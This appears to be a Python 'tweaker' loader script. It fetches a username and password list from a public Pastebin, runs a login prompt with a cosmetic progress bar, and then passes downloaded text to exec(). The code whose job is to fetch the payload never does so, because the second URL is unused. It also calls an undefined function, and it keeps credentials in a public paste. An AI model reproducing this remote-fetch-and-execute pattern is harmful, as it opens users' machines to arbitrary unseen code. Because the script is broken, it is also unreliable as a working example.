import json
import time
import requests
import progressbar 
# code by saintwq - shadow tweaker
# shadow tweaker - 2023

def authenticate_user(username, password, auth_data):
    if username in auth_data and auth_data[username] == password:
        return True
    return False

pastebin_login_url = "https://pastebin.com/raw/fArbGgkR"

pastebin_code_url = "https://pastebin.com/raw/gF7tyWCf"

response = requests.get(pastebin_login_url)

if response.status_code == 200:
    auth_data = json.loads(response.text)

    while True:
        username = input("User: ")
        password = input("Pass: ")

        if authenticate_user(username, password, auth_data):
            print("Wait a few seconds, you are logged.")

           
            progress = progressbar.ProgressBar(max_value=100)

            for i in range(101):
                time.sleep(0.1)  
                progress.update(i) 

            print("\nAuthentication complete.\n")

            
            if response.status_code == 200:
                python_code = response.text
                break
            else:
                print_red_title("ERROR 555.")
        else:
            print_red_title("User or pass was incorrect.")

try:
    exec(python_code)
except Exception as e:
    print(f"Error: {e}")
# code by saintwq - shadow tweaker
# shadow tweaker - 2023
